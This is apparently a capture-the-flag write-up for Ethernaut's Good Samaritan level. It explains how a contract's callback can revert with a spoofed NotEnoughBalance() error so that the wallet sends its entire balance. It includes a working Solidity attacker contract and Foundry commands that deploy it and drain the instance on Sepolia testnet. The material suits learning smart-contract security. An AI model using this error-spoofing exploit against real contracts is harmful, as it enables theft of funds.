# Ethernaut Challenge 27 — Good Samaritan

This challenge demonstrates how error handling and external contract callbacks can be abused to change the execution flow of a donation system.

The `GoodSamaritan` contract tries to donate `10` coins to anyone requesting them. If the donation fails with a very specific error, it assumes the wallet does not have enough balance left and transfers the entire remaining balance instead.

The goal is to exploit that logic and drain all the coins from the wallet.

Instance address:

```text
0x8B307734D65ceB74A52B350BC13b0cA8B7859246
````

---

## 🎯 Goal

Drain the full balance from the `Wallet` contract.

---

## 🧠 Thought process

The key function is `requestDonation()`:

```solidity
function requestDonation() external returns (bool enoughBalance) {
    try wallet.donate10(msg.sender) {
        return true;
    } catch (bytes memory err) {
        if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```

At first glance, the intended logic is:

* donate `10` coins to the requester
* if the wallet truly does not have enough balance, send the remainder

The interesting part is that the fallback branch is triggered only if the revert data matches:

```solidity
abi.encodeWithSignature("NotEnoughBalance()")
```

So the challenge becomes:

> can we force `wallet.donate10(msg.sender)` to revert with `NotEnoughBalance()` even when the wallet still has plenty of coins?

The answer is yes.

---

## 🔍 Vulnerability summary

The `Wallet` sends coins through `Coin.transfer()`:

```solidity
function transfer(address dest_, uint256 amount_) external {
    uint256 currentBalance = balances[msg.sender];

    if (amount_ <= currentBalance) {
        balances[msg.sender] -= amount_;
        balances[dest_] += amount_;

        if (dest_.isContract()) {
            INotifyable(dest_).notify(amount_);
        }
    } else {
        revert InsufficientBalance(currentBalance, amount_);
    }
}
```

If the recipient is a contract, `Coin.transfer()` calls:

```solidity
INotifyable(dest_).notify(amount_);
```

This means that if the requester is a smart contract, that contract can run custom logic during the transfer.

So instead of calling `requestDonation()` from an EOA, we call it from an attacker contract implementing `INotifyable`.

Then the execution flow becomes:

```text
GoodSamaritan.requestDonation()
        ↓
Wallet.donate10(attacker)
        ↓
Coin.transfer(attacker, 10)
        ↓
attacker.notify(10)
```

If `notify(10)` reverts with the custom error `NotEnoughBalance()`, the revert bubbles up to `GoodSamaritan`, which then incorrectly assumes the wallet is almost empty and executes:

```solidity
wallet.transferRemainder(msg.sender);
```

That sends the full wallet balance to the attacker contract.

---

## ⚠️ Important subtlety

The attacker contract must not revert on every notification.

If it also reverts when `transferRemainder()` tries to send the full balance, the whole exploit fails.

So the contract should:

* revert only when `amount == 10`
* do nothing for the final full-balance transfer

---

## 🛠️ Attacker contract

To solve the challenge, I wrote the [Notifyable.sol](./Notifyable.sol) contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {INotifyable, GoodSamaritan} from "./GoodSamaritan.sol";

contract Notifyable is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan public goodSamaritan;

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure override {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
```

---

## ✅ Why this works

During `requestDonation()`:

1. `wallet.donate10(attacker)` tries to send `10`
2. `Coin.transfer()` detects that the recipient is a contract
3. it calls `notify(10)`
4. the attacker reverts with `NotEnoughBalance()`
5. `GoodSamaritan` catches that specific error
6. it calls `wallet.transferRemainder(attacker)`
7. the wallet now sends its full remaining balance
8. `notify(1000000)` is called, but this time the attacker does not revert
9. the transfer succeeds

So the contract tricks `GoodSamaritan` into taking the “send everything left” branch.

---

## 🧪 Local test

I wrote the test [GoodSamaritanTest.t.sol](../../test/GoodSamaritanTest.t.sol)

The test verifies that:

* before the exploit:

  * wallet balance is `1_000_000`
  * attacker balance is `0`
* after the exploit:

  * wallet balance is `0`
  * attacker balance is `1_000_000`

This confirms that the full wallet balance is drained.

---

## 🚀 Solve on Sepolia

First, inspect the challenge instance:

```bash
GOOD=0x8B307734D65ceB74A52B350BC13b0cA8B7859246

WALLET=$(cast call $GOOD "wallet()(address)" --rpc-url $SEPOLIA_RPC_URL | tr -d '\n')
COIN=$(cast call $GOOD "coin()(address)" --rpc-url $SEPOLIA_RPC_URL | tr -d '\n')

echo "WALLET: $WALLET"
echo "COIN:   $COIN"
```

Output:

```text
WALLET: 0x463259860fbd478f1B7e8813d3827d1d74d93fF4
COIN:   0x8AcE467DCB3f0cbc060d1Fc27d6bf30d0ffBBC56
```

Check the initial wallet balance:

```bash
cast call $COIN "balances(address)(uint256)" $WALLET --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
1000000
```

So the wallet starts with one million coins.

---

## 📦 Deploy the attacker contract

```bash
forge create src/challenge-27-good-samaritan/Notifyable.sol:Notifyable \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $GOOD
```

Deployed to:

```text
0x52Cd5087218b95B75a3aFca3e754e18F4AaB82cD
```

Save it:

```bash
NOTIFYABLE=0x52Cd5087218b95B75a3aFca3e754e18F4AaB82cD
```

---

## ⚔️ Execute the exploit

```bash
cast send $NOTIFYABLE \
    "attack()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

## ✅ Verify the result

Check the wallet balance again:

```bash
cast call $COIN "balances(address)(uint256)" $WALLET --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0
```

The wallet balance is now zero, so the challenge is solved.

---


